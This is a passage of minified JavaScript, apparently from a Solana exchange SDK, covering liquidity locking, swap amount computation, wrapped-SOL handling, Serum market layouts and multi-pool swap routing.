              skipCloseAccount: !(w && d),
              associatedOnly: !w,
              checkCreateATAOwner: !1,
            });
        (f = v), A && m.addInstruction(A);
        let { account: k, instructionParams: I } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: n.mintB.programId,
            mint: new Ji(n.mintB.address),
            notUseTokenAccount: b,
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !(b && d),
            associatedOnly: !b,
            checkCreateATAOwner: !1,
          });
        (h = k),
          I && m.addInstruction(I),
          (!f || !h) &&
            this.logAndCreateError("cannot found target token accounts", {
              tokenAccountA: f,
              tokenAccountB: h,
            });
        let S = null != (e = t.poolKeys) ? e : await this.getCpmmPoolKeys(n.id),
          { publicKey: _ } = y_(p, o, Bc),
          { publicKey: T } = gx(i, o),
          { publicKey: B } = y_(s, new Ji(n.lpMint.address), Bc);
        return (
          m.addInstruction({
            instructions: [
              _x({
                programId: null != i ? i : N_,
                nftOwner: this.scope.ownerPubKey,
                auth: null != s ? s : D_,
                nftAccount: _,
                lockPda: T,
                poolId: new Ji(n.id),
                mintLp: new Ji(S.mintLp.address),
                userVaultA: f,
                userVaultB: h,
                poolVaultA: new Ji(S.vault.A),
                poolVaultB: new Ji(S.vault.B),
                mintA: g,
                mintB: y,
                lockLpVault: B,
                lpFeeAmount: r,
                cpmmProgram: null == a ? void 0 : a.programId,
                cpmmAuthProgram: null == a ? void 0 : a.authProgram,
              }),
            ],
            instructionTypes: [i_],
          }),
          m.addCustomComputeBudget(u),
          m.addTipInstruction(c),
          m.versionBuild({ txVersion: l })
        );
      }
      computeSwapAmount({ pool: t, amountIn: e, outputMint: n, slippage: r }) {
        let o = n.toString() === t.mintB.address,
          i = ox.swap(
            e,
            o ? t.baseReserve : t.quoteReserve,
            o ? t.quoteReserve : t.baseReserve,
            t.configInfo.tradeFeeRate
          ),
          s = new bI(i.destinationAmountSwapped.toString()).div(
            i.sourceAmountSwapped.toString()
          ),
          a = i.destinationAmountSwapped
            .mul(new Yn(1e4 * (1 - r)))
            .div(new Yn(1e4));
        return {
          allTrade: i.sourceAmountSwapped.eq(e),
          amountIn: e,
          amountOut: i.destinationAmountSwapped,
          minAmountOut: a,
          executionPrice: s,
          fee: i.tradeFee,
          priceImpact: t.poolPrice.sub(s).div(t.poolPrice),
        };
      }
      computePairAmount({
        poolInfo: t,
        baseReserve: e,
        quoteReserve: n,
        amount: r,
        slippage: o,
        epochInfo: i,
        baseIn: s,
      }) {
        var a, u, c, l, d, f, h, p, m;
        let g = 1 - Number(o.toSignificant()) / 100,
          y = new Yn(
            new bI(r)
              .mul(10 ** t[s ? "mintA" : "mintB"].decimals)
              .mul(g)
              .toFixed(0)
          ),
          w = K_(y, t[s ? "mintA" : "mintB"].extensions.feeConfig, i, !1),
          b = y.sub(null != (a = w.fee) ? a : new Yn(0)),
          v = new Yn(
            new bI(t.lpAmount)
              .mul(10 ** t.lpMint.decimals)
              .toFixed(0, bI.ROUND_DOWN)
          );
        this.logDebug(
          "baseReserve:",
          e.toString(),
          "quoteReserve:",
          n.toString()
        ),
          this.logDebug(
            "tokenIn:",
            s ? t.mintA.symbol : t.mintB.symbol,
            "amountIn:",
            y.toString(),
            "amountInFee:",
            null != (c = null == (u = w.fee) ? void 0 : u.toString()) ? c : 0,
            "anotherToken:",
            s ? t.mintB.symbol : t.mintA.symbol,
            "slippage:",
            `${o.toSignificant()}%`
          );
        let A = s ? "base" : "quote";
        this.logDebug("input side:", A);
        let k = b.mul(v).div("base" === A ? e : n),
          I = { amount: nS, fee: void 0, expirationTime: void 0 };
        if (!b.isZero()) {
          let r = (function (t, e, n, r) {
            let o = t.mul(e).div(r);
            !o.isZero() && !t.mul(e).mod(r).isZero() && (o = o.add(new Yn(1)));
            let i = t.mul(n).div(r);
            return (
              !i.isZero() &&
                !t.mul(n).mod(r).isZero() &&
                (i = i.add(new Yn(1))),
              { amountA: o, amountB: i }
            );
          })(k, e, n, v);
          this.logDebug("lpAmountData:", {
            amountA: r.amountA.toString(),
            amountB: r.amountB.toString(),
          }),
            (I = K_(
              r[s ? "amountB" : "amountA"],
              t[s ? "mintB" : "mintA"].extensions.feeConfig,
              i,
              !0
            ));
        }
        let S = new QI(new Yn(1)).add(o),
          _ = new QI(new Yn(1)).sub(o),
          T = K_(
            S.mul(I.amount.sub(null != (l = I.fee) ? l : new Yn(0))).quotient,
            t[s ? "mintB" : "mintA"].extensions.feeConfig,
            i,
            !0
          ),
          B = K_(
            _.mul(I.amount.sub(null != (d = I.fee) ? d : new Yn(0))).quotient,
            t[s ? "mintB" : "mintA"].extensions.feeConfig,
            i,
            !0
          );
        return (
          this.logDebug(
            "anotherAmount:",
            I.amount.toString(),
            "anotherAmountFee:",
            null != (h = null == (f = I.fee) ? void 0 : f.toString()) ? h : 0,
            "maxAnotherAmount:",
            T.amount.toString(),
            "maxAnotherAmountFee:",
            null != (m = null == (p = T.fee) ? void 0 : p.toString()) ? m : 0
          ),
          {
            inputAmountFee: w,
            anotherAmount: I,
            maxAnotherAmount: T,
            minAnotherAmount: B,
            liquidity: k,
          }
        );
      }
    };
  var Ex = { [I_.toBase58()]: 3 },
    xx = { 3: I_ },
    Px = JT([
      RT(5),
      RT(8),
      jT("ownAddress"),
      zT("vaultSignerNonce"),
      jT("baseMint"),
      jT("quoteMint"),
      jT("baseVault"),
      zT("baseDepositsTotal"),
      zT("baseFeesAccrued"),
      jT("quoteVault"),
      zT("quoteDepositsTotal"),
      zT("quoteFeesAccrued"),
      zT("quoteDustThreshold"),
      jT("requestQueue"),
      jT("eventQueue"),
      jT("bids"),
      jT("asks"),
      zT("baseLotSize"),
      zT("quoteLotSize"),
      zT("feeRateBps"),
      zT("referrerRebatesAccrued"),
      RT(7),
    ]),
    Ox = { 3: Px },
    Rx = PA("Serum"),
    Mx = class {
      static getProgramId(t) {
        let e = xx[t];
        return e || Rx.logWithError("invalid version", "version", t), e;
      }
      static getVersion(t) {
        let e = t.toBase58(),
          n = Ex[e];
        return n || Rx.logWithError("invalid program id", "programId", e), n;
      }
      static getStateLayout(t) {
        let e = Ox[t];
        return e || Rx.logWithError(!!e, "invalid version", "version", t), e;
      }
      static getLayouts(t) {
        return { state: this.getStateLayout(t) };
      }
      static getAssociatedAuthority({ programId: t, marketId: e }) {
        let n,
          r = [e.toBuffer()],
          o = 0;
        for (; o < 100; ) {
          try {
            let e = r.concat(dt.from([o]), dt.alloc(7));
            n = Ji.createProgramAddressSync(e, t);
          } catch (V_) {
            if (V_ instanceof TypeError) throw V_;
            o++;
            continue;
          }
          return { publicKey: n, nonce: o };
        }
        return (
          Rx.logWithError(
            "unable to find a viable program address nonce",
            "params",
            { programId: t, marketId: e }
          ),
          { publicKey: Ji.default, nonce: o }
        );
      }
    };
  function Lx(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p) {
    var m;
    let g = [],
      y = [
        LI({ pubkey: Bc, isWritable: !1 }),
        LI({ pubkey: Cc, isWritable: !1 }),
        LI({ pubkey: Ec, isWritable: !1 }),
        LI({ pubkey: Gs.programId, isWritable: !1 }),
        LI({ pubkey: e, isSigner: !0 }),
      ];
    y.push(LI({ pubkey: n })), y.push(LI({ pubkey: o }));
    let w = [u, c],
      b = [l, d],
      v = [i, s, a];
    for (let I = 0; I < w.length; I++) {
      let t = w[I],
        e = v[I] === t.mintA.address;
      if (
        (y.push(LI({ pubkey: new Ji(t.programId), isWritable: !1 })),
        I === w.length - 1
          ? y.push(LI({ pubkey: o }))
          : y.push(LI({ pubkey: r })),
        y.push(LI({ pubkey: new Ji(v[I]) })),
        y.push(LI({ pubkey: new Ji(v[I + 1]) })),
        6 === t.version)
      ) {
        let n = b[I];
        y.push(LI({ pubkey: new Ji(n.config.id) })),
          y.push(LI({ pubkey: new Ji(n.id) })),
          y.push(LI({ pubkey: new Ji(e ? n.vault.A : n.vault.B) })),
          y.push(LI({ pubkey: new Ji(e ? n.vault.B : n.vault.A) })),
          y.push(LI({ pubkey: new Ji(t.observationId) })),
          y.push(LI({ pubkey: zI })),
          y.push(
            LI({ pubkey: TC(new Ji(t.programId), new Ji(t.id)).publicKey })
          ),
          g.push(Nx(t.sqrtPriceX64.toString(), e));
        for (let t of null != (m = p[I]) ? m : [])
          y.push(LI({ pubkey: new Ji(t) }));
      } else if (5 === t.version) {
        let t = b[I];
        y.push(LI({ pubkey: new Ji(t.id) })),
          y.push(LI({ pubkey: new Ji(t.authority), isWritable: !1 })),
          y.push(LI({ pubkey: new Ji(t.marketProgramId) })),
          y.push(LI({ pubkey: new Ji(t.marketAuthority) })),
          y.push(LI({ pubkey: __, isWritable: !1 })),
          y.push(LI({ pubkey: new Ji(t.openOrders) })),
          y.push(LI({ pubkey: new Ji(t.vault.A) })),
          y.push(LI({ pubkey: new Ji(t.vault.B) })),
          y.push(LI({ pubkey: new Ji(t.id) })),
          y.push(LI({ pubkey: new Ji(t.id) })),
          y.push(LI({ pubkey: new Ji(t.id) })),
          y.push(LI({ pubkey: new Ji(t.id) })),
          y.push(LI({ pubkey: new Ji(t.id) })),
          y.push(LI({ pubkey: new Ji(t.id) })),
          y.push(LI({ pubkey: new Ji(t.marketId) })),
          y.push(LI({ pubkey: new Ji(t.marketBids) })),
          y.push(LI({ pubkey: new Ji(t.marketAsks) })),
          y.push(LI({ pubkey: new Ji(t.marketEventQueue) })),
          y.push(LI({ pubkey: new Ji(t.marketBaseVault) })),
          y.push(LI({ pubkey: new Ji(t.marketQuoteVault) }));
      } else if (4 === t.version) {
        let e = b[I],
          n = 1 !== t.status;
        y.push(LI({ pubkey: new Ji(e.id) })),
          y.push(LI({ pubkey: new Ji(e.authority), isWritable: !1 })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.marketProgramId) })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.marketAuthority) })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.openOrders) })),
          y.push(LI({ pubkey: new Ji(e.vault.A) })),
          y.push(LI({ pubkey: new Ji(e.vault.B) })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.marketId) })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.marketBids) })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.marketAsks) })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.marketEventQueue) })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.marketBaseVault) })),
          y.push(LI({ pubkey: new Ji(n ? e.id : e.marketQuoteVault) }));
      } else {
        if (7 !== t.version) throw Error("pool type error");
        {
          let n = b[I];
          y.push(LI({ pubkey: new Ji(n.authority) })),
            y.push(LI({ pubkey: new Ji(n.config.id) })),
            y.push(LI({ pubkey: new Ji(n.id) })),
            y.push(LI({ pubkey: new Ji(e ? n.vault.A : n.vault.B) })),
            y.push(LI({ pubkey: new Ji(e ? n.vault.B : n.vault.A) })),
            y.push(LI({ pubkey: new Ji(t.observationId) }));
        }
      }
    }
    let A = JT([
        UT("insId"),
        zT("amountIn"),
        zT("amountOut"),
        YT(KT(), g.length, "clmmPriceLimit"),
      ]),
      k = dt.alloc(A.span);
    return (
      A.encode({ insId: 0, amountIn: f, amountOut: h, clmmPriceLimit: g }, k),
      new vs({ keys: y, programId: t, data: k })
    );
  }
  function Nx(t, e) {
    if (t) {
      if (e) {
        let e = new Yn(t).div(new Yn(25));
        return e.gt(nC) ? e : nC;
      }
      {
        let e = new Yn(t).mul(new Yn(25));
        return e.lt(rC) ? e : rC;
      }
    }
    return e ? nC : rC;
  }
  var Dx = new Yn(0),
    Ux = class extends cT {
      constructor(t) {
        super(t);
      }
      async getWSolAccounts() {
        this.scope.checkOwner(),
          await this.scope.account.fetchWalletTokenAccounts();
        let t = this.scope.account.tokenAccounts.filter((t) =>
          t.mint.equals(GI)
        );
        return (
          t.sort((t, e) =>
            t.isAssociated
              ? 1
              : e.isAssociated || t.amount.lt(e.amount)
              ? -1
              : 1
          ),
          t
        );
      }
      async unWrapWSol(t) {
        let { amount: e, tokenProgram: n, txVersion: r = 1, feePayer: o } = t,
          i = await this.getWSolAccounts(),
          s = this.createTxBuilder(o);
        s.addCustomComputeBudget(t.computeBudgetConfig);
        let a = II(e);
        for (let u = 0; u < i.length; u++)
          a.gte(i[u].amount)
            ? (s.addInstruction({
                instructions: [
                  nB({
                    tokenAccount: i[u].publicKey,
                    payer: this.scope.ownerPubKey,
                    owner: this.scope.ownerPubKey,
                    programId: n,
                  }),
                ],
              }),
              a.sub(i[u].amount))
            : s.addInstruction({
                instructions: [
                  nB({
                    tokenAccount: i[u].publicKey,
                    payer: this.scope.ownerPubKey,
                    owner: this.scope.ownerPubKey,
                    programId: n,
                  }),
                ],
              });
        return s.versionBuild({ txVersion: r });
      }
      async wrapWSol(t, e, n, r) {
        let o = this.createTxBuilder(r),
          i = await rB({
            connection: this.scope.connection,
            owner: this.scope.ownerPubKey,
            payer: this.scope.ownerPubKey,
            amount: t,
            skipCloseAccount: !0,
          });
        return (
          o.addInstruction(i), o.versionBuild({ txVersion: null != n ? n : 1 })
        );
      }
      async swap({
        swapInfo: t,
        swapPoolKeys: e,
        ownerInfo: n,
        computeBudgetConfig: r,
        routeProgram: o,
        txVersion: i,
        feePayer: s,
      }) {
        let a,
          u,
          c = this.createTxBuilder(s),
          l = t.amountIn,
          d = t.amountOut,
          f = l.amount.token.mint.equals(GI),
          h = d.amount.token.mint.equals(GI),
          p = l.amount.token.mint,
          m = d.amount.token.mint,
          { account: g, instructionParams: y } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: l.amount.token.isToken2022 ? Cc : Bc,
              mint: p,
              notUseTokenAccount: f,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !f,
              createInfo: f
                ? { payer: this.scope.ownerPubKey, amount: l.amount.raw }
                : void 0,
              associatedOnly: !f && n.associatedOnly,
              checkCreateATAOwner: n.checkCreateATAOwner,
            });
        if ((y && c.addInstruction(y), void 0 === g))
          throw Error("input account check error");
        if ("route" !== t.routeType || h) {
          let { account: t, instructionParams: e } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: d.amount.token.isToken2022 ? Cc : Bc,
              mint: m,
              notUseTokenAccount: h,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !0,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              associatedOnly: !h && n.associatedOnly,
              checkCreateATAOwner: n.checkCreateATAOwner,
            });
          (a = t), e && c.addInstruction(e);
        } else
          a = this.scope.account.getAssociatedTokenAccount(
            m,
            d.amount.token.isToken2022 ? Cc : Bc
          );
        if (
          (h &&
            c.addInstruction({
              endInstructions: [
                nB({
                  owner: this.scope.ownerPubKey,
                  payer: this.scope.ownerPubKey,
                  tokenAccount: a,
                  programId: Bc,
                }),
              ],
              endInstructionTypes: [gS],
            }),
          "route" === t.routeType)
        ) {
          let e = t.middleToken;
          u = this.scope.account.getAssociatedTokenAccount(
            e.mint,
            e.isToken2022 ? Cc : Bc
          );
        }
        let w =
            e || (await this.computePoolToPoolKeys({ pools: t.poolInfoList })),
          b = (function ({
            routeProgram: t,
            ownerInfo: e,
            inputMint: n,
            swapInfo: r,
          }) {
            var o, i, s, a, u, c, l;
            if ("amm" === r.routeType) {
              if (6 === r.poolInfo[0].version) {
                let t = r.poolKey[0],
                  a = eS(t),
                  u = n.equals(a.mintA.address) ? tC.add(VB) : eC.sub(VB);
                return cE.makeSwapBaseInInstructions({
                  poolInfo: t,
                  poolKeys: t,
                  observationId: r.poolInfo[0].observationId,
                  ownerInfo: {
                    wallet: e.wallet,
                    tokenAccountA: a.mintA.address.equals(n)
                      ? e.sourceToken
                      : e.destinationToken,
                    tokenAccountB: a.mintA.address.equals(n)
                      ? e.destinationToken
                      : e.sourceToken,
                  },
                  inputMint: n,
                  amountIn: r.amountIn.amount.raw,
                  amountOutMin: r.minAmountOut.amount.raw.sub(
                    null !=
                      (i = null == (o = r.minAmountOut.fee) ? void 0 : o.raw)
                      ? i
                      : new Yn(0)
                  ),
                  sqrtPriceLimitX64: u,
                  remainingAccounts:
                    null != (s = r.remainingAccounts[0]) ? s : [],
                });
              }
              if (7 === r.poolInfo[0].version) {
                let t = r.poolInfo[0],
                  o = n.toString() === r.poolInfo[0].mintA.address;
                return {
                  signers: [],
                  instructions: [
                    kx(
                      t.programId,
                      e.wallet,
                      t.authority,
                      t.configId,
                      t.id,
                      e.sourceToken,
                      e.destinationToken,
                      o ? t.vaultA : t.vaultB,
                      o ? t.vaultB : t.vaultA,
                      o ? t.mintProgramA : t.mintProgramB,
                      o ? t.mintProgramB : t.mintProgramA,
                      new Ji(t[o ? "mintA" : "mintB"].address),
                      new Ji(t[o ? "mintB" : "mintA"].address),
                      t.observationId,
                      r.amountIn.amount.raw,
                      r.minAmountOut.amount.raw
                    ),
                  ],
                  lookupTableAddress: [],
                  instructionTypes: [o ? n_ : r_],
                  address: {},
                };
              }
              {
                let t = r.poolKey[0];
                return {
                  signers: [],
                  instructions: [
                    zE({
                      poolKeys: t,
                      version: r.poolInfo[0].pooltype.includes("StablePool")
                        ? 5
                        : 4,
                      userKeys: {
                        tokenAccountIn: e.sourceToken,
                        tokenAccountOut: e.destinationToken,
                        owner: e.wallet,
                      },
                      amountIn: r.amountIn.amount.raw,
                      amountOut: r.minAmountOut.amount.raw.sub(
                        null !=
                          (u =
                            null == (a = r.minAmountOut.fee) ? void 0 : a.raw)
                          ? u
                          : new Yn(0)
                      ),
                      fixedSide: "in",
                    }),
                  ],
                  lookupTableAddress: t.lookupTableAccount
                    ? [t.lookupTableAccount]
                    : [],
                  instructionTypes: [
                    r.poolInfo[0].pooltype.includes("StablePool") ? qS : LS,
                  ],
                  address: {},
                };
              }
            }
            if ("route" === r.routeType) {
              let o = r.poolInfo[0],
                i = r.poolInfo[1],
                s = r.poolKey[0],
                a = r.poolKey[1];
              if (void 0 === e.routeToken)
                throw Error("owner route token account check error");
              return {
                signers: [],
                instructions: [
                  Lx(
                    t,
                    e.wallet,
                    e.sourceToken,
                    e.routeToken,
                    e.destinationToken,
                    n.toString(),
                    r.middleToken.mint.toString(),
                    r.outputMint.toString(),
                    o,
                    i,
                    s,
                    a,
                    r.amountIn.amount.raw,
                    r.minAmountOut.amount.raw.sub(
                      null !=
                        (l = null == (c = r.minAmountOut.fee) ? void 0 : c.raw)
                        ? l
                        : new Yn(0)
                    ),
                    r.remainingAccounts
                  ),
                ],
                instructionTypes: [zS],
                lookupTableAddress: [
                  s.lookupTableAccount,
                  a.lookupTableAccount,
                ].filter((t) => void 0 !== t),
                address: {},
              };
            }
            throw Error("route type error");
          })({
            routeProgram: o,
            inputMint: p,
            swapInfo: _A(SA({}, t), {
              poolInfo: [...t.poolInfoList],
              poolKey: w,
              outputMint: m,
            }),
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              sourceToken: g,
              routeToken: u,
              destinationToken: a,
            },
          });
        if (void 0 !== t.feeConfig) {
          let e = this.createTxBuilder();
          e.addInstruction({
            instructions: [
              _l(
                g,
                t.feeConfig.feeAccount,
                this.scope.ownerPubKey,
                t.feeConfig.feeAmount.toNumber()
              ),
            ],
            instructionTypes: [yS],
          }),
            e.addInstruction(b);
          let { transactions: n } =
            0 === i ? await e.sizeCheckBuildV0() : await e.sizeCheckBuild();
          n.length < 2 &&
            c.addInstruction({
              instructions: [
                _l(
                  g,
                  t.feeConfig.feeAccount,
                  this.scope.ownerPubKey,
                  t.feeConfig.feeAmount.toNumber()
                ),
              ],
              instructionTypes: [yS],
            });
        }
        return (
          c.addInstruction(b),
          0 === i
            ? c.sizeCheckBuildV0({ computeBudgetConfig: r, address: b.address })
            : c.sizeCheckBuild({ computeBudgetConfig: r, address: b.address })
        );
      }
      async fetchRoutePoolBasicInfo(t) {
        let { amm: e = S_, clmm: n = T_, cpmm: r = M_ } = t || {},
          o = await this.scope.connection.getProgramAccounts(e, {
            dataSlice: { offset: wE.offsetOf("baseMint"), length: 64 },
          }),
          i = JT([jT("baseMint"), jT("quoteMint")]),
          s = o.map((t) => ({
            id: t.pubkey,
            version: 4,
            mintA: i.decode(t.account.data).baseMint,
            mintB: i.decode(t.account.data).quoteMint,
          })),
          a = JT([jT("mintA"), jT("mintB")]);
        return {
          clmmPools: (
            await this.scope.connection.getProgramAccounts(n, {
              filters: [{ dataSize: QC.span }],
              dataSlice: { offset: QC.offsetOf("mintA"), length: 64 },
            })
          ).map((t) => {
            let e = a.decode(t.account.data);
            return { id: t.pubkey, version: 6, mintA: e.mintA, mintB: e.mintB };
          }),
          ammPools: s,
          cpmmPools: (
            await this.scope.connection.getProgramAccounts(r, {
              dataSlice: { offset: Bx.offsetOf("mintA"), length: 64 },
            })
          ).map((t) => {
            let e = a.decode(t.account.data);
            return { id: t.pubkey, version: 7, mintA: e.mintA, mintB: e.mintB };
          }),
        };
      }
      getAllRoute({
        inputMint: t,
        outputMint: e,
        clmmPools: n,
        ammPools: r,
        cpmmPools: o,
      }) {
        (t = t.toString() === Ji.default.toString() ? GI : t),
          (e = e.toString() === Ji.default.toString() ? GI : e);
        let i = {},
          s = {},
          a = {},
          u = [],
          c = {};
        for (let d of null != n ? n : []) {
          if (
            (((d.mintA.equals(t) && d.mintB.equals(e)) ||
              (d.mintA.equals(e) && d.mintB.equals(t))) &&
              (u.push(d), (s[d.id.toString()] = d)),
            d.mintA.equals(t))
          ) {
            let t = d.mintB.toString();
            void 0 === c[t] &&
              (c[t] = { mintProgram: Bc, in: [], out: [], mDecimals: 0 }),
              c[t].in.push(d);
          }
          if (d.mintB.equals(t)) {
            let t = d.mintA.toString();
            void 0 === c[t] &&
              (c[t] = { mintProgram: Bc, in: [], out: [], mDecimals: 0 }),
              c[t].in.push(d);
          }
          if (d.mintA.equals(e)) {
            let t = d.mintB.toString();
            void 0 === c[t] &&
              (c[t] = { mintProgram: Bc, in: [], out: [], mDecimals: 0 }),
              c[t].out.push(d);
          }
          if (d.mintB.equals(e)) {
            let t = d.mintA.toString();
            void 0 === c[t] &&
              (c[t] = { mintProgram: Bc, in: [], out: [], mDecimals: 0 }),
              c[t].out.push(d);
          }
        }
        let l = [];
        for (let d of r)
          ((d.mintA.equals(t) && d.mintB.equals(e)) ||
            (d.mintA.equals(e) && d.mintB.equals(t))) &&
            (u.push(d), (i[d.id.toBase58()] = d), l.push(d)),
            d.mintA.equals(t) &&
              (void 0 === c[d.mintB.toBase58()] &&
                (c[d.mintB.toBase58()] = {
                  mintProgram: Bc,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintB.toBase58()].in.push(d)),
            d.mintB.equals(t) &&
              (void 0 === c[d.mintA.toBase58()] &&
                (c[d.mintA.toBase58()] = {
                  mintProgram: Bc,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintA.toBase58()].in.push(d)),
            d.mintA.equals(e) &&
              (void 0 === c[d.mintB.toBase58()] &&
                (c[d.mintB.toBase58()] = {
                  mintProgram: Bc,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintB.toBase58()].out.push(d)),
            d.mintB.equals(e) &&
              (void 0 === c[d.mintA.toBase58()] &&
                (c[d.mintA.toBase58()] = {
                  mintProgram: Bc,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintA.toBase58()].out.push(d));
        for (let d of o)
          ((d.mintA.equals(t) && d.mintB.equals(e)) ||
            (d.mintA.equals(e) && d.mintB.equals(t))) &&
            (u.push(d), (a[d.id.toBase58()] = d)),
            d.mintA.equals(t) &&
              (void 0 === c[d.mintB.toBase58()] &&
                (c[d.mintB.toBase58()] = {
                  mintProgram: Bc,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintB.toBase58()].in.push(d)),
            d.mintB.equals(t) &&
              (void 0 === c[d.mintA.toBase58()] &&
                (c[d.mintA.toBase58()] = {
                  mintProgram: Bc,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintA.toBase58()].in.push(d)),
            d.mintA.equals(e) &&
              (void 0 === c[d.mintB.toBase58()] &&
                (c[d.mintB.toBase58()] = {
                  mintProgram: Bc,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintB.toBase58()].out.push(d)),
            d.mintB.equals(e) &&
              (void 0 === c[d.mintA.toBase58()] &&
                (c[d.mintA.toBase58()] = {
                  mintProgram: Bc,
                  in: [],
                  out: [],
                  mDecimals: 0,
                }),
              c[d.mintA.toBase58()].out.push(d));
        for (let d of Object.keys(c)) {
          if (
            1 === c[d].in.length &&
            1 === c[d].out.length &&
            c[d].in[0].id.equals(c[d].out[0].id)
          ) {
            delete c[d];
            continue;
          }
          if (0 === c[d].in.length || 0 === c[d].out.length) {
            delete c[d];
            continue;
          }
          let t = c[d];
          for (let e of t.in)
            for (let n of t.out)
              6 === e.version && void 0 === s[e.id.toString()]
                ? (s[e.id.toString()] = e)
                : 7 === e.version && void 0 === a[e.id.toString()]
                ? (a[e.id.toString()] = e)
                : (4 === e.version || 5 === e.version) &&
                  void 0 === i[e.id.toString()] &&
                  (i[e.id.toString()] = e),
                6 === n.version && void 0 === s[n.id.toString()]
                  ? (s[n.id.toString()] = n)
                  : 7 === n.version && void 0 === a[n.id.toString()]
                  ? (a[n.id.toString()] = n)
                  : (4 === n.version || 5 === n.version) &&
                    void 0 === i[n.id.toString()] &&
                    (i[n.id.toString()] = n);
        }
        return {
          directPath: u,
          addLiquidityPools: l,
          routePathDict: c,
          needSimulate: Object.values(i),
          needTickArray: Object.values(s),
          cpmmPoolList: Object.values(a),
        };
      }
      async fetchSwapRoutesData({ routes: t, inputMint: e, outputMint: n }) {
        let r = new Set([
          ...t.needTickArray
            .map((t) => [t.mintA.toBase58(), t.mintB.toBase58()])
            .flat(),
          e.toString(),
          n.toString(),
        ]);
        void 0;
        let o = await this.scope.liquidity.getRpcPoolInfos(
            t.needSimulate.map((t) => t.id)
          ),
          i = HE(o),
          s = {};
        Object.values(i).forEach((t) => {
          r.delete(t.mintA.address),
            (s[t.mintA.address] = {
              address: new Ji(t.mintA.address),
              programId: Bc,
              mintAuthority: null,
              supply: BigInt(0),
              decimals: t.mintA.decimals,
              isInitialized: !0,
              freezeAuthority: null,
              tlvData: dt.from("0", "hex"),
              feeConfig: void 0,
            }),
            r.delete(t.mintB.address),
            (s[t.mintB.address] = {
              address: new Ji(t.mintB.address),
              programId: Bc,
              mintAuthority: null,
              supply: BigInt(0),
              decimals: t.mintB.decimals,
              isInitialized: !0,
              freezeAuthority: null,
              tlvData: dt.from("0", "hex"),
              feeConfig: void 0,
            });
        }),
          void 0;
        let a = await this.scope.cpmm.getRpcPoolInfos(
          t.cpmmPoolList.map((t) => t.id.toBase58()),
          !0
        );
        Object.values(a).forEach((t) => {
          let [e, n] = [t.mintA.toBase58(), t.mintB.toBase58()];
          t.mintProgramA.equals(Bc)
            ? (r.delete(e),
              (s[e] = {
                address: t.mintA,
                programId: t.mintProgramA,
                mintAuthority: null,
                supply: BigInt(0),
                decimals: t.mintDecimalA,
                isInitialized: !0,
                freezeAuthority: null,
                tlvData: dt.from("0", "hex"),
                feeConfig: void 0,
              }))
            : r.add(e),
            t.mintProgramB.equals(Bc)
              ? (r.delete(n),
                (s[n] = {
                  address: t.mintB,
                  programId: t.mintProgramB,
                  mintAuthority: null,
                  supply: BigInt(0),
                  decimals: t.mintDecimalB,
                  isInitialized: !0,
                  freezeAuthority: null,
                  tlvData: dt.from("0", "hex"),
                  feeConfig: void 0,
                }))
              : r.add(n);
        }),
          void 0;
        let u = await DA({
          connection: this.scope.connection,
          mints: Array.from(r).map((t) => new Ji(t)),
        });
        s = SA(SA({}, s), u);
        let c = this.scope.cpmm.toComputePoolInfos({ pools: a, mintInfos: s });
        void 0;
        let l = await this.scope.clmm.getRpcClmmPoolInfos({
            poolIds: t.needTickArray.map((t) => t.id),
          }),
          { computeClmmPoolInfo: d, computePoolTickData: f } =
            await this.scope.clmm.getComputeClmmPoolInfos({
              clmmPoolsRpcInfo: l,
              mintInfos: s,
            }),
          h = Object.keys(t.routePathDict).reduce(
            (e, n) =>
              _A(SA({}, e), {
                [n]: _A(SA({}, t.routePathDict[n]), {
                  mintProgram: s[n].programId,
                  mDecimals: s[n].decimals,
                  in: t.routePathDict[n].in.map(
                    (t) =>
                      i[t.id.toBase58()] ||
                      d[t.id.toBase58()] ||
                      c[t.id.toBase58()]
                  ),
                  out: t.routePathDict[n].out.map(
                    (t) =>
                      i[t.id.toBase58()] ||
                      d[t.id.toBase58()] ||
                      c[t.id.toBase58()]
                  ),
                }),
              }),
            {}
          );
        return {
          mintInfos: s,
          ammPoolsRpcInfo: o,
          ammSimulateCache: i,
          clmmPoolsRpcInfo: l,
          computeClmmPoolInfo: d,
          computePoolTickData: f,
          computeCpmmData: c,
          routePathDict: h,
        };
      }
      getAllRouteComputeAmountOut({
        inputTokenAmount: t,
        outputToken: e,
        directPath: n,
        routePathDict: r,
        simulateCache: o,
        tickCache: i,
        slippage: s,
        chainTime: a,
        epochInfo: u,
        feeConfig: c,
      }) {
        var l, d, f, h, p, m, g, y, w;
        let b =
            void 0 === c
              ? new Yn(0)
              : t.raw.mul(new Yn(c.feeBps.toNumber())).div(new Yn(1e4)),
          v = t.raw.sub(b),
          A = new OI(t.token, v),
          k =
            void 0 === c ? void 0 : { feeAmount: b, feeAccount: c.feeAccount },
          I = _A(SA({}, e), { address: HI(e.address).toString() }),
          S = [];
        for (let B of n)
          try {
            S.push(
              _A(
                SA(
                  {},
                  this.computeAmountOut({
                    itemPool: B,
                    tickCache: i,
                    simulateCache: o,
                    chainTime: a,
                    epochInfo: u,
                    slippage: s,
                    outputToken: I,
                    amountIn: A,
                  })
                ),
